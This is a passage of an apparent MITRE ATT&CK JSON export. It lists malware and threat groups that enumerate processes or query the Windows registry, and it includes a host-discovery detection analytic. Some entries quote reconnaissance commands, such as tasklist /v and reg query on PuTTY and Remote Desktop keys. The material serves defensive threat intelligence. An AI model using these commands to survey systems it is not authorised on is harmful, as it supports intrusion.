        "description": "MarkiRAT can search for different processes on a system.[171]"
      },
      {
        "id": "S0449",
        "name": "Maze",
        "description": "Maze has gathered all of the running system processes.[172]"
      },
      {
        "id": "S1059",
        "name": "metaMain",
        "description": "metaMain can enumerate the processes that run on the platform.[169][173]"
      },
      {
        "id": "S0455",
        "name": "Metamorfo",
        "description": "Metamorfo has performed process name checks and has monitored applications.[174]"
      },
      {
        "id": "S0688",
        "name": "Meteor",
        "description": "Meteor can check if a specific process is running, such as Kaspersky's avp.exe.[175]"
      },
      {
        "id": "S0079",
        "name": "MobileOrder",
        "description": "MobileOrder has a command to upload information about all running processes to its C2 server.[176]"
      },
      {
        "id": "G0021",
        "name": "Molerats",
        "description": "Molerats actors obtained a list of active processes on the victim and sent them to C2 servers.[87]"
      },
      {
        "id": "S0149",
        "name": "MoonWind",
        "description": "MoonWind has a command to return a list of running processes.[177]"
      },
      {
        "id": "S0256",
        "name": "Mosquito",
        "description": "Mosquito runs tasklist to obtain running processes.[178]"
      },
      {
        "id": "G0069",
        "name": "MuddyWater",
        "description": "MuddyWater has used malware to obtain a list of running processes on the system.[179][180]"
      },
      {
        "id": "G0129",
        "name": "Mustang Panda",
        "description": "Mustang Panda has used tasklist /v to determine active process information.[181]"
      },
      {
        "id": "S0247",
        "name": "NavRAT",
        "description": "NavRAT uses tasklist /v to check running processes.[182]"
      },
      {
        "id": "S0630",
        "name": "Nebulae",
        "description": "Nebulae can enumerate processes on a target system.[183]"
      },
      {
        "id": "S0034",
        "name": "NETEAGLE",
        "description": "NETEAGLE can send process listings over the C2 channel.[27]"
      },
      {
        "id": "S0198",
        "name": "NETWIRE",
        "description": "NETWIRE can discover processes on compromised hosts.[184]"
      },
      {
        "id": "S1090",
        "name": "NightClub",
        "description": "NightClub has the ability to use GetWindowThreadProcessId to identify the process behind a specified window.[185]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can search a list of running processes for Tr.exe.[186]"
      },
      {
        "id": "S0644",
        "name": "ObliqueRAT",
        "description": "ObliqueRAT can check for blocklisted process names on a compromised host.[187]"
      },
      {
        "id": "S0346",
        "name": "OceanSalt",
        "description": "OceanSalt can collect the name and ID for every process running on the system.[188]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has run tasklist on a victim's machine.[189]"
      },
      {
        "id": "C0012",
        "name": "Operation CuckooBees",
        "description": "During Operation CuckooBees, the threat actors used the tasklist command as part of their advanced reconnaissance.[190]"
      },
      {
        "id": "C0006",
        "name": "Operation Honeybee",
        "description": "During Operation Honeybee, the threat actors obtained a list of running processes on a victim machine using cmd /c tasklist > %temp%\\temp.ini.[191]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, the threat actors used tasklist to collect a list of running processes on an infected system.[192]"
      },
      {
        "id": "S0229",
        "name": "Orz",
        "description": "Orz can gather a process list from the victim.[193]"
      },
      {
        "id": "S1017",
        "name": "OutSteel",
        "description": "OutSteel can identify running processes on a compromised host.[194]"
      },
      {
        "id": "S0626",
        "name": "P8RAT",
        "description": "P8RAT can check for specific processes associated with virtual environments.[195]"
      },
      {
        "id": "S0664",
        "name": "Pandora",
        "description": "Pandora can monitor processes on a compromised host.[196]"
      },
      {
        "id": "S0208",
        "name": "Pasam",
        "description": "Pasam creates a backdoor through which remote attackers can retrieve lists of running processes.[197]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can obtain a list of running processes on a compromised host.[110]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later.[198]"
      },
      {
        "id": "S0501",
        "name": "PipeMon",
        "description": "PipeMon can iterate over the running processes to find a suitable injection target.[199]"
      },
      {
        "id": "S0254",
        "name": "PLAINTEE",
        "description": "PLAINTEE performs the tasklist command to list running processes.[200]"
      },
      {
        "id": "S0435",
        "name": "PLEAD",
        "description": "PLEAD has the ability to list processes on the compromised host.[201]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX has a module to list the processes running on a machine.[202]"
      },
      {
        "id": "S0428",
        "name": "PoetRAT",
        "description": "PoetRAT has the ability to list all running processes.[203]"
      },
      {
        "id": "S0216",
        "name": "POORAIM",
        "description": "POORAIM can enumerate processes.[204]"
      },
      {
        "id": "G0033",
        "name": "Poseidon Group",
        "description": "After compromising a victim, Poseidon Group lists all running processes.[205]"
      },
      {
        "id": "S0139",
        "name": "PowerDuke",
        "description": "PowerDuke has a command to list the victim's processes.[206]"
      },
      {
        "id": "S0441",
        "name": "PowerShower",
        "description": "PowerShower has the ability to deploy a reconnaissance module to retrieve a list of the active processes.[207]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit's Get-ProcessTokenPrivilege Privesc-PowerUp module can enumerate privileges for a given process.[208][209]"
      },
      {
        "id": "S0393",
        "name": "PowerStallion",
        "description": "PowerStallion has been used to monitor process lists.[210]"
      },
      {
        "id": "S0223",
        "name": "POWERSTATS",
        "description": "POWERSTATS has used get_tasklist to discover processes on the compromised host.[211]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may collect process information by running tasklist on a victim.[212]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc lists processes running on the system.[158]"
      },
      {
        "id": "S0192",
        "name": "Pupy",
        "description": "Pupy can list the running processes and get the process ID and parent process’s ID.[213]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot has the ability to check running processes.[214]"
      },
      {
        "id": "S0629",
        "name": "RainyDay",
        "description": "RainyDay can enumerate processes on a target system.[183]"
      },
      {
        "id": "S0458",
        "name": "Ramsay",
        "description": "Ramsay can gather a list of running processes by using Tasklist.[215]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA lists the system’s processes.[216][217]"
      },
      {
        "id": "S0662",
        "name": "RCSession",
        "description": "RCSession can identify processes based on PID.[218]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec can obtain a process list from the victim.[219]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun can enumerate all running processes and process information on an infected machine.[220]"
      },
      {
        "id": "G0106",
        "name": "Rocke",
        "description": "Rocke can detect a running process's PID on the infected machine.[221]"
      },
      {
        "id": "S0270",
        "name": "RogueRobin",
        "description": "RogueRobin checks the running processes for evidence it may be running in a sandbox environment. It specifically enumerates processes for Wireshark and Sysinternals.[222]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can list the current running processes on the system.[223][224]"
      },
      {
        "id": "S1078",
        "name": "RotaJakiro",
        "description": "RotaJakiro can monitor the /proc/[PID] directory of known RotaJakiro processes as a part of its persistence when executing with non-root permissions. If the process is found dead, it resurrects the process. RotaJakiro processes can be matched to an associated Advisory Lock, in the /proc/locks folder, to ensure it doesn't spawn more than one process.[225]"
      },
      {
        "id": "S1073",
        "name": "Royal",
        "description": "Royal can use GetCurrentProcess to enumerate processes.[226]"
      },
      {
        "id": "S0148",
        "name": "RTM",
        "description": "RTM can obtain information about process integrity levels.[227]"
      },
      {
        "id": "S0446",
        "name": "Ryuk",
        "description": "Ryuk has called CreateToolhelp32Snapshot to enumerate all running processes.[228]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has enumerated running processes on a compromised host to determine if it is running under the process name dfrgui.exe.[194]"
      },
      {
        "id": "S1085",
        "name": "Sardonic",
        "description": "Sardonic has the ability to execute the tasklist command.[229]"
      },
      {
        "id": "S0461",
        "name": "SDBbot",
        "description": "SDBbot can enumerate a list of running processes on a compromised machine.[230]"
      },
      {
        "id": "S0345",
        "name": "Seasalt",
        "description": "Seasalt has a command to perform a process listing.[33]"
      },
      {
        "id": "S0596",
        "name": "ShadowPad",
        "description": "ShadowPad has collected the PID of a malicious process.[231]"
      },
      {
        "id": "S0445",
        "name": "ShimRatReporter",
        "description": "ShimRatReporter listed all running processes on the machine.[232]"
      },
      {
        "id": "S0063",
        "name": "SHOTPUT",
        "description": "SHOTPUT has a command to obtain a process listing.[233]"
      },
      {
        "id": "G0121",
        "name": "Sidewinder",
        "description": "Sidewinder has used tools to identify running processes on the victim's machine.[234]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can enumerate processes, including properties to determine if they have the Common Language Runtime (CLR) loaded.[235]"
      },
      {
        "id": "S0468",
        "name": "Skidmap",
        "description": "Skidmap has monitored critical processes to ensure resiliency.[236]"
      },
      {
        "id": "S0533",
        "name": "SLOTHFULMEDIA",
        "description": "SLOTHFULMEDIA has enumerated processes by ID, name, or privileges.[237]"
      },
      {
        "id": "S0273",
        "name": "Socksbot",
        "description": "Socksbot can list all running processes.[238]"
      },
      {
        "id": "S0627",
        "name": "SodaMaster",
        "description": "SodaMaster can search a list of running processes.[195]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used multiple command-line utilities to enumerate running processes.[239][240][241]"
      },
      {
        "id": "S0615",
        "name": "SombRAT",
        "description": "SombRAT can use the getprocesslist command to enumerate processes on a compromised host.[242][123][243]"
      },
      {
        "id": "S0516",
        "name": "SoreFang",
        "description": "SoreFang can enumerate processes on a victim machine through use of Tasklist.[244]"
      },
      {
        "id": "G0038",
        "name": "Stealth Falcon",
        "description": "Stealth Falcon malware gathers a list of running processes.[245]"
      },
      {
        "id": "S0142",
        "name": "StreamEx",
        "description": "StreamEx has the ability to enumerate processes.[246]"
      },
      {
        "id": "S0491",
        "name": "StrongPity",
        "description": "StrongPity can determine if a user is logged in by checking to see if explorer.exe is running.[247]"
      },
      {
        "id": "S0559",
        "name": "SUNBURST",
        "description": "SUNBURST collected a list of process names that were hashed using a FNV-1a + XOR algorithm to check against similarly-hashed hardcoded blocklists.[248]"
      },
      {
        "id": "S0562",
        "name": "SUNSPOT",
        "description": "SUNSPOT monitored running processes for instances of MsBuild.exe by hashing the name of each running process and comparing it to the corresponding value 0x53D525. It also extracted command-line arguments and individual arguments from the running MsBuild.exe process to identify the directory path of the Orion software Visual Studio solution.[249]"
      },
      {
        "id": "S1064",
        "name": "SVCReady",
        "description": "SVCReady can collect a list of running processes from an infected host.[250]"
      },
      {
        "id": "S0018",
        "name": "Sykipot",
        "description": "Sykipot may gather a list of running processes by running tasklist /v.[251]"
      },
      {
        "id": "S0242",
        "name": "SynAck",
        "description": "SynAck enumerates all running processes.[252][253]"
      },
      {
        "id": "S0464",
        "name": "SYSCON",
        "description": "SYSCON has the ability to use Tasklist to list running processes.[254]"
      },
      {
        "id": "S0663",
        "name": "SysUpdate",
        "description": "SysUpdate can collect information about running processes.[255]"
      },
      {
        "id": "S0011",
        "name": "Taidoor",
        "description": "Taidoor can use GetCurrentProcessId for process discovery.[256]"
      },
      {
        "id": "S0586",
        "name": "TAINTEDSCRIBE",
        "description": "TAINTEDSCRIBE can execute ProcessList for process discovery.[257]"
      },
      {
        "id": "S0467",
        "name": "TajMahal",
        "description": "TajMahal has the ability to identify running processes and associated plugins on an infected host.[258]"
      },
      {
        "id": "S0057",
        "name": "Tasklist",
        "description": "Tasklist can be used to discover processes running on a system.[259]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has searched for rival malware and removes it if found.[260] TeamTNT has also searched for running processes containing the strings aliyun or liyun to identify machines running Alibaba Cloud Security tools.[261]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest obtains a list of running processes using the function kill_unwanted.[262]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot uses module networkDll for process list discovery.[263][264]"
      },
      {
        "id": "S0094",
        "name": "Trojan.Karagany",
        "description": "Trojan.Karagany can use Tasklist to collect a list of running tasks.[26][265]"
      },
      {
        "id": "G0081",
        "name": "Tropic Trooper",
        "description": "Tropic Trooper is capable of enumerating the running processes on the system using pslist.[266][267]"
      },
      {
        "id": "S0436",
        "name": "TSCookie",
        "description": "TSCookie has the ability to list processes on the infected host.[268]"
      },
      {
        "id": "G0010",
        "name": "Turla",
        "description": "Turla surveys a system upon check-in to discover running processes using the tasklist /v command.[98] Turla RPC backdoors have also enumerated processes associated with specific open ports or named pipes.[210]"
      },
      {
        "id": "S0333",
        "name": "UBoatRAT",
        "description": "UBoatRAT can list running processes on the system.[269]"
      },
      {
        "id": "S0022",
        "name": "Uroburos",
        "description": "Uroburos can use its Process List command to enumerate processes on compromised hosts.[270]"
      },
      {
        "id": "S0386",
        "name": "Ursnif",
        "description": "Ursnif has gathered information about running processes.[271][272]"
      },
      {
        "id": "S0452",
        "name": "USBferry",
        "description": "USBferry can use tasklist to gather information about the process running on the infected system.[267]"
      },
      {
        "id": "S0476",
        "name": "Valak",
        "description": "Valak has the ability to enumerate running processes on a compromised host.[273]"
      },
      {
        "id": "S0257",
        "name": "VERMIN",
        "description": "VERMIN can get a list of the processes and running tasks on the system.[274]"
      },
      {
        "id": "S0180",
        "name": "Volgmer",
        "description": "Volgmer can gather a list of processes.[275]"
      },
      {
        "id": "G1017",
        "name": "Volt Typhoon",
        "description": "Volt Typhoon has enumerated running processes on targeted systems.[276][277]"
      },
      {
        "id": "S0670",
        "name": "WarzoneRAT",
        "description": "WarzoneRAT can obtain a list of processes on a compromised host.[278]"
      },
      {
        "id": "S0579",
        "name": "Waterbear",
        "description": "Waterbear can identify the process for a specific security product.[279]"
      },
      {
        "id": "G0112",
        "name": "Windshift",
        "description": "Windshift has used malware to enumerate active processes.[280]"
      },
      {
        "id": "S0219",
        "name": "WINERACK",
        "description": "WINERACK can enumerate processes.[204]"
      },
      {
        "id": "S0059",
        "name": "WinMM",
        "description": "WinMM sets a WH_CBT Windows hook to collect information on process creation.[281]"
      },
      {
        "id": "S0141",
        "name": "Winnti for Windows",
        "description": "Winnti for Windows can check if the explorer.exe process is responsible for calling its install function.[282]"
      },
      {
        "id": "G0044",
        "name": "Winnti Group",
        "description": "Winnti Group looked for a specific process running on infected servers.[283]"
      },
      {
        "id": "S1065",
        "name": "Woody RAT",
        "description": "Woody RAT can call NtQuerySystemProcessInformation with SystemProcessInformation to enumerate all running processes, including associated information such as PID, parent PID, image name, and owner.[284]"
      },
      {
        "id": "S0161",
        "name": "XAgentOSX",
        "description": "XAgentOSX contains the getProcessList function to run ps aux to get running processes.[285]"
      },
      {
        "id": "S0248",
        "name": "yty",
        "description": "yty gets an output of running processes using the tasklist command.[286]"
      },
      {
        "id": "S0251",
        "name": "Zebrocy",
        "description": "Zebrocy uses the tasklist and wmic process get Capture, ExecutablePath commands to gather the processes running on the system.[51][287][52][288][289]"
      },
      {
        "id": "S0330",
        "name": "Zeus Panda",
        "description": "Zeus Panda checks for running processes on the victim’s machine.[290]"
      },
      {
        "id": "S0672",
        "name": "Zox",
        "description": "Zox has the ability to list processes.[291]"
      },
      {
        "id": "S0412",
        "name": "ZxShell",
        "description": "ZxShell has a command, ps, to obtain a listing of processes on the system.[292]"
      },
      {
        "id": "S1013",
        "name": "ZxxZ",
        "description": "ZxxZ has created a snapshot of running processes using CreateToolhelp32Snapshot.[293]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that may attempt to get information about running processes on a system."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls may attempt to get information about running processes on a system."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to get information about running processes on a system. To be effective in deciphering malicious and benign activity, the full command line is essential. Similarly, having information about the parent process can help with making decisions and tuning to an environment.Because these commands are built in, they may be run frequently by power users or even by normal users. Thus, an analytic looking at this information should have well-defined white- or blacklists, and should consider looking at an anomaly detection approach, so that this information can be learned dynamically.Within the built-in Windows Commands:hostnameipconfignetquserqwinstasc with flags query, queryex, qcsysteminfotasklistdsquerywhoamiNote dsquery is only pre-existing on Windows servers.Analytic 1 - Host Discovery Commands info_command = filter process where ( exe == \"hostname.exe\" or exe == \"ipconfig.exe\" or exe == \"net.exe\" or exe == \"quser.exe\" or exe == \"qwinsta.exe\" or exe == \"sc\" and (command_line match \" query\" or command_line match \" qc\")) or exe == \"systeminfo.exe\" or exe == \"tasklist.exe\" or exe == \"whoami.exe\")"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Query Registry",
    "Code": "T1012",
    "Description": "Adversaries may interact with the Windows Registry to gather information about the system, configuration, and installed software.The Registry contains a significant amount of information about the operating system, configuration, software, and security.[1] Information can easily be queried using the Reg utility, though other means to access the Registry exist. Some of the information may help adversaries to further their operation within a network. Adversaries may use the information from Query Registry during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.",
    "Mitigation": [
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL can enumerate registry keys.[2][3]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32's backdoor can query the Windows Registry to gather system information. [4]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used various strains of malware to query the Registry.[5]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has opened the registry and performed query searches.[6]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can check for installed software on the system under the Registry key Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall.[7]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has executed the reg query command for HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default.[8]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "BACKSPACE is capable of enumerating and making modifications to an infected system's Registry.[9]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot searches for certain Registry keys to be configured before executing the payload.[10]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can query Windows\\CurrentVersion\\Uninstall for installed applications.[11][12]"
      },
      {
        "id": "S0574",
        "name": "BendyBear",
        "description": "BendyBear can query the host's Registry key at HKEY_CURRENT_USER\\Console\\QuickEdit to retrieve data.[13]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal has used the RegQueryValueExA function to retrieve proxy information in the Registry.[14]"
      },
      {
        "id": "S0570",
        "name": "BitPaymer",
        "description": "BitPaymer can use the RegEnumKeyW to iterate through Registry keys.[15]"
      },
      {
        "id": "S0252",
        "name": "Brave Prince",
        "description": "Brave Prince gathers information about the Registry.[16]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can check the Registry for specific keys.[17]"
      },
      {
        "id": "S0030",
        "name": "Carbanak",
        "description": "Carbanak checks the Registry key HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings for proxy configurations information.[18]"
      },
      {
        "id": "S0484",
        "name": "Carberp",
        "description": "Carberp has searched the Image File Execution Options registry key for \"Debugger\" within every subkey.[19]"
      },
      {
        "id": "S0335",
        "name": "Carbon",
        "description": "Carbon enumerates values in the Registry.[20]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT contains watchdog functionality that periodically ensures HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Load is set to point to its executable.[21]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower has the ability to enumerate Uninstall registry values.[22]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has queried Registry keys using reg query \\\\HKU\\\\SOFTWARE\\Microsoft\\Terminal Server Client\\Servers and reg query \\\\HKU\\\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.[23]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "CHOPSTICK provides access to the Windows Registry, which can be used to gather information.[24]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling has the ability to enumerate Registry keys, including KEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt\\strDataDir to search for a bitcoin wallet.[25][26]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can query HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\\Excel\\Security\\AccessVBOM\\  to determine if the security setting for restricting default programmatic access is enabled.[27][28]"
      },
      {
        "id": "S0126",
        "name": "ComRAT",
        "description": "ComRAT can check the default browser by querying HKCR\\http\\shell\\open\\command.[29]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson can check the Registry for the presence of HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\last_edate to determine how long it has been installed on a host.[30]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman can query the Registry to determine if it has already been installed on the system.[31]"
      },
      {
        "id": "S0354",
        "name": "Denis",
        "description": "Denis queries the Registry for keys and values.[32]"
      },
      {
        "id": "S0021",
        "name": "Derusbi",
        "description": "Derusbi is capable of enumerating Registry keys and values.[33]"
      },
      {
        "id": "S0186",
        "name": "DownPaper",
        "description": "DownPaper searches and reads the value of the Windows Update Registry Run key.[34]"
      },
      {
        "id": "G0035",
        "name": "Dragonfly",
        "description": "Dragonfly has queried the Registry to identify victim information.[35]"
      },
      {
        "id": "S0567",
        "name": "Dtrack",
        "description": "Dtrack can collect the RegisteredOwner, RegisteredOrganization, and InstallDate registry values.[36]"
      },
      {
        "id": "S0091",
        "name": "Epic",
        "description": "Epic uses the rem reg query command to obtain values from Registry keys.[37]"
      },
      {
        "id": "S0512",
        "name": "FatDuke",
        "description": "FatDuke can get user agent strings for the default browser from HKCU\\Software\\Classes\\http\\shell\\open\\command.[38]"
      },
      {
        "id": "S0267",
        "name": "FELIXROOT",
        "description": "FELIXROOT queries the Registry for specific keys for potential privilege escalation and proxy information. FELIXROOT has also used WMI to query the Windows Registry.[39][40]"
      },
      {
        "id": "S0182",
        "name": "FinFisher",
        "description": "FinFisher queries Registry values as part of its anti-sandbox checks.[41][42]"
      },
      {
        "id": "G0117",
        "name": "Fox Kitten",
        "description": "Fox Kitten has accessed Registry hives ntuser.dat and UserClass.dat.[43]"
      },
      {
        "id": "S1044",
        "name": "FunnyDream",
        "description": "FunnyDream can check Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings to extract the ProxyServer string.[44]"
      },
      {
        "id": "S0666",
        "name": "Gelsemium",
        "description": "Gelsemium can open random files and Registry keys to obscure malware behavior from sandbox analysis.[45]"
      },
      {
        "id": "S0032",
        "name": "gh0st RAT",
        "description": "gh0st RAT has checked for the existence of a Service key to determine if it has already been installed on the system.[46]"
      },
      {
        "id": "S0249",
        "name": "Gold Dragon",
        "description": "Gold Dragon enumerates registry keys with the command regkeyenum and obtains information for the Registry key HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run.[16]"
      },
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "A variant of HOPLIGHT hooks lsass.exe, and lsass.exe then checks the Registry for the data value 'rdpproto' under the key SYSTEM\\CurrentControlSet\\Control\\Lsa Name.[47]"
      },
      {
        "id": "S0203",
        "name": "Hydraq",
        "description": "Hydraq creates a backdoor through which remote attackers can retrieve system information, such as CPU speed, from Registry keys.[48][49]"
      },
      {
        "id": "S0604",
        "name": "Industroyer",
        "description": "Industroyer has a data wiper component that enumerates keys in the Registry HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services.[50]"
      },
      {
        "id": "S0260",
        "name": "InvisiMole",
        "description": "InvisiMole can enumerate Registry values, keys, and data.[51]"
      },
      {
        "id": "S0201",
        "name": "JPIN",
        "description": "JPIN can enumerate Registry keys.[52]"
      },
      {
        "id": "G0094",
        "name": "Kimsuky",
        "description": "Kimsuky has obtained specific Registry keys and values on a compromised host.[53]"
      },
      {
        "id": "G0032",
        "name": "Lazarus Group",
        "description": "Lazarus Group malware IndiaIndia checks Registry keys within HKCU and HKLM to determine if certain applications are present, including SecureCRT, Terminal Services, RealVNC, TightVNC, UltraVNC, Radmin, mRemote, TeamViewer, FileZilla, pcAnyware, and Remote Desktop. Another Lazarus Group malware sample checks for the presence of the following Registry key:HKEY_CURRENT_USER\\Software\\Bitcoin\\Bitcoin-Qt.[54][55][56]"
      },
      {
        "id": "S0513",
        "name": "LiteDuke",
        "description": "LiteDuke can query the Registry to check for the presence of HKCU\\Software\\KasperskyLab.[38]"
      },
      {
        "id": "S0680",
        "name": "LitePower",
        "description": "LitePower can query the Registry for keys added to execute COM hijacking.[57]"
      },
      {
        "id": "S0532",
        "name": "Lucifer",
        "description": "Lucifer can check for existing stratum cryptomining information in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\spreadCpuXmr – %stratum info%.[58]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can enumerate Registry keys with all subkeys and values.[59]"
      },
      {
        "id": "S1015",
        "name": "Milan",
        "description": "Milan can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID.[60]"
      },
      {
        "id": "S1047",
        "name": "Mori",
        "description": "Mori can read data from the Registry including from HKLM\\Software\\NFC\\IPA andHKLM\\Software\\NFC\\.[61]"
      },
      {
        "id": "S0385",
        "name": "njRAT",
        "description": "njRAT can read specific registry values.[62]"
      },
      {
        "id": "G0049",
        "name": "OilRig",
        "description": "OilRig has used reg query \"HKEY_CURRENT_USER\\Software\\Microsoft\\Terminal Server Client\\Default\" on a victim to query the Registry.[63]"
      },
      {
        "id": "C0014",
        "name": "Operation Wocao",
        "description": "During Operation Wocao, the threat actors executed /c cd /d c:\\windows\\temp\\ & reg query HKEY_CURRENT_USER\\Software\\<username>\\PuTTY\\Sessions\\ to detect recent PuTTY sessions, likely to further lateral movement.[64]"
      },
      {
        "id": "S0165",
        "name": "OSInfo",
        "description": "OSInfo queries the registry to look for information about Terminal Services.[65]"
      },
      {
        "id": "S1050",
        "name": "PcShare",
        "description": "PcShare can search the registry files of a compromised host.[44]"
      },
      {
        "id": "S0517",
        "name": "Pillowmint",
        "description": "Pillowmint has used shellcode which reads code stored in the registry keys \\REGISTRY\\SOFTWARE\\Microsoft\\DRM using the native Windows API as well as read HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces as part of its C2.[66]"
      },
      {
        "id": "S0013",
        "name": "PlugX",
        "description": "PlugX can enumerate and query for information contained within the Windows Registry.[67][68]"
      },
      {
        "id": "S0145",
        "name": "POWERSOURCE",
        "description": "POWERSOURCE queries Registry keys in preparation for setting Run keys to achieve persistence.[69]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.[70][71]"
      },
      {
        "id": "S0184",
        "name": "POWRUNER",
        "description": "POWRUNER may query the Registry by running reg query on a victim.[72]"
      },
      {
        "id": "S0238",
        "name": "Proxysvc",
        "description": "Proxysvc gathers product names from the Registry key: HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion ProductName and the processor description from the Registry key HKLM\\HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0 ProcessorNameString.[73]"
      },
      {
        "id": "S0269",
        "name": "QUADAGENT",
        "description": "QUADAGENT checks if a value exists within a Registry key in the HKCU hive whose name is the same as the scheduled task it has created.[74]"
      },
      {
        "id": "S1076",
        "name": "QUIETCANARY",
        "description": "QUIETCANARY has the ability to retrieve information from the Registry.[75]"
      },
      {
        "id": "S0241",
        "name": "RATANKBA",
        "description": "RATANKBA uses the command reg query \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\InternetSettings\".[76]"
      },
      {
        "id": "S0172",
        "name": "Reaver",
        "description": "Reaver queries the Registry to determine the correct Startup path to use for persistence.[77]"
      },
      {
        "id": "S0075",
        "name": "Reg",
        "description": "Reg may be used to gather details from the Windows Registry of a local or remote system at the command-line interface.[78]"
      },
      {
        "id": "S0496",
        "name": "REvil",
        "description": "REvil can query the Registry to get random file extensions to append to encrypted files.[79]"
      },
      {
        "id": "S0448",
        "name": "Rising Sun",
        "description": "Rising Sun has identified the OS product name from a compromised host by searching the registry for SOFTWARE\\MICROSOFT\\Windows NT\\ CurrentVersion | ProductName.[80]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can access the HKLM\\System\\CurrentControlSet\\Services\\mssmbios\\Data\\SMBiosData Registry key to obtain the System manufacturer value to identify the machine type.[81]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has used check_registry_keys as part of its environmental checks.[82]"
      },
      {
        "id": "S0140",
        "name": "Shamoon",
        "description": "Shamoon queries several Registry keys to identify hard disk partitions to overwrite.[83]"
      },
      {
        "id": "S1019",
        "name": "Shark",
        "description": "Shark can query HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Cryptography MachineGuid to retrieve the machine GUID.[60]"
      },
      {
        "id": "S0589",
        "name": "Sibot",
        "description": "Sibot has queried the registry for proxy server information.[84]"
      },
      {
        "id": "S0692",
        "name": "SILENTTRINITY",
        "description": "SILENTTRINITY can use the GetRegValue function to check Registry keys within HKCU\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated and HKLM\\Software\\Policies\\Microsoft\\Windows\\Installer\\AlwaysInstallElevated. It also contains additional modules that can check software AutoRun values and use the Win32 namespace to get values from HKCU, HKLM, HKCR, and HKCC hives.[85]"
      },
      {
        "id": "S0627",
